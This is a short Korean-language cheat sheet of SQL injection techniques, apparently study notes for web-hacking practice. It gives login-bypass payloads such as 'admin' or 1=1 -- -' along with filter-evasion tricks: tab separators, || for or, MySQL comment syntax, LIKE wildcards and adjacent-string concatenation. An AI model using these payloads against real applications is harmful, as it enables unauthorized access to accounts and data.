### 1) cheetsheet
```sql
admin' or 1=1 -- -

admin ' --
```

### 2) 탭
SQL 구분자 공백 이외에 탭을 구분자로 사용해도 동일하게 동작합니다.

### 3) or
|| 로 변경 가능하다.

### 4) -- 
MySql에서 -- 로 주석 처리하는 경우 -- 뒤에 구분자가 와야합니다.

구분자 예시)
```
공백, 탭
--
#
/**/
```

### 5) like
like로 필터링 우회가능
```sql
SELECT *
FROM USER
WHERE ID LIKE 'ad___'
```
### 6) 문자열 사이 공백
mysql에서 문자열 사이에 공백이 있으면 문자열 합성이 발생합니다.

```sql
SELECT *
FROM USER
WHERE ID LIKE 'ad'	'min'
```

### 7) 세미콜론
원래 SQL이 실행되기 위해서는 세미콜론이 있어야하는데, PHP - mysqli_query 와 같은 함수에서 자동으로 넣어줍니다.